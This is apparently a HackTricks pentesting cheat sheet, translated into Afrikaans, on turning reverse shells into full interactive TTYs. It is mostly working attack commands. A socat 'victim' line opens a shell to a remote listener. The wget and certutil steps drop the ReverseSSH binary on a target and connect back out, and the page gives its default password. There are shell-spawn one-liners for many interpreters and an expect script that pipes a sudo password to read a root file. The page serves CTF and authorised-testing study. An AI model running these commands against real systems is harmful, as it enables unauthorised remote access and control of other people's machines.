# Volledige TTY's

{{#include ../../banners/hacktricks-training.md}}

## Volledige TTY

Let daarop dat die shell wat jy in die `SHELL`-variable stel **binne** _**/etc/shells**_ **gelys moet wees**, anders verskyn `The value for the SHELL variable was not found in the /etc/shells file This incident has been reported`. Let ook daarop dat die volgende snippets slegs in bash werk. As jy in zsh is, skakel na bash voordat jy die shell verkry deur `bash` uit te voer.

#### Python
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'

(inside the nc session) CTRL+Z;stty raw -echo; fg; ls; export SHELL=/bin/bash; export TERM=screen; stty rows 38 columns 116; reset;
```
> [!TIP]
> Jy kan die **aantal** **rye** en **kolomme** verkry deur **`stty -a`** uit te voer.

#### script
```bash
script /dev/null -qc /bin/bash #/dev/null is to not store anything
(inside the nc session) CTRL+Z;stty raw -echo; fg; ls; export SHELL=/bin/bash; export TERM=screen; stty rows 38 columns 116; reset;
```
#### socat
```bash
#Listener:
socat file:`tty`,raw,echo=0 tcp-listen:4444

#Victim:
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444
```
### **Spawn shells**

- `python -c 'import pty; pty.spawn("/bin/sh")'`
- `echo os.system('/bin/bash')`
- `/bin/sh -i`
- `script -qc /bin/bash /dev/null`
- `perl -e 'exec "/bin/sh";'`
- perl: `exec "/bin/sh";`
- ruby: `exec "/bin/sh"`
- lua: `os.execute('/bin/sh')`
- IRB: `exec "/bin/sh"`
- vi: `:!bash`
- vi: `:set shell=/bin/bash:shell`
- nmap: `!sh`

## ReverseSSH

'n Gerieflike manier vir **interactive shell access**, sowel as **file transfers** en **port forwarding**, is om die staties-gekoppelde ssh-server [ReverseSSH](https://github.com/Fahrj/reverse-ssh) op die teikenstelsel te plaas.<sup>[[1]](#references)</sup>

Hieronder is 'n voorbeeld vir `x86` met upx-saamgeperste binaries. Vir ander binaries, kyk na die [releases page](https://github.com/Fahrj/reverse-ssh/releases/latest/).

1. Berei dit plaaslik voor om die ssh port forwarding-versoek op te vang:
```bash
# Drop it via your preferred way, e.g.
wget -q https://github.com/Fahrj/reverse-ssh/releases/latest/download/upx_reverse-sshx86 -O /dev/shm/reverse-ssh && chmod +x /dev/shm/reverse-ssh

/dev/shm/reverse-ssh -v -l -p 4444
```
- (2a) Linux-teiken:
```bash
# Drop it via your preferred way, e.g.
wget -q https://github.com/Fahrj/reverse-ssh/releases/latest/download/upx_reverse-sshx86 -O /dev/shm/reverse-ssh && chmod +x /dev/shm/reverse-ssh

/dev/shm/reverse-ssh -p 4444 kali@10.0.0.2
```
- (2b) Windows 10-teiken (kyk die [projek se readme](https://github.com/Fahrj/reverse-ssh#features) vir vroeëre weergawes):
```bash
# Drop it via your preferred way, e.g.
certutil.exe -f -urlcache https://github.com/Fahrj/reverse-ssh/releases/latest/download/upx_reverse-sshx86.exe reverse-ssh.exe

reverse-ssh.exe -p 4444 kali@10.0.0.2
```
- As die ReverseSSH-poortaanstuurversoek suksesvol was, behoort jy nou te kan aanmeld met die verstekwagwoord `letmeinbrudipls` in die konteks van die gebruiker wat `reverse-ssh(.exe)` uitvoer:
```bash
# Interactive shell access
ssh -p 8888 127.0.0.1

# Bidirectional file transfer
sftp -P 8888 127.0.0.1
```
## Penelope

[Penelope](https://github.com/brightio/penelope) gradeer Linux reverse shells outomaties op na TTY, hanteer die terminal-grootte, log alles en nog baie meer. Dit bied ook readline-ondersteuning vir Windows shells.<sup>[[2]](#references)</sup>

![penelope](https://github.com/user-attachments/assets/27ab4b3a-780c-4c07-a855-fd80a194c01e)

## Geen TTY

As jy om een of ander rede nie 'n volledige TTY kan verkry nie, **kan jy steeds interaksie hê met programme** wat gebruikersinvoer verwag. In die volgende voorbeeld word die wagwoord aan `sudo` deurgegee om 'n lêer te lees:
```bash
expect -c 'spawn sudo -S cat "/root/root.txt";expect "*password*";send "<THE_PASSWORD_OF_THE_USER>";send "\r\n";interact'
```
## Verwysings

- [1] [ReverseSSH - Statically-linked ssh server with reverse shell functionality for CTFs and such](https://github.com/Fahrj/reverse-ssh)
- [2] [Penelope - Shell handler that automates a few things to make life easier](https://github.com/brightio/penelope)

{{#include ../../banners/hacktricks-training.md}}
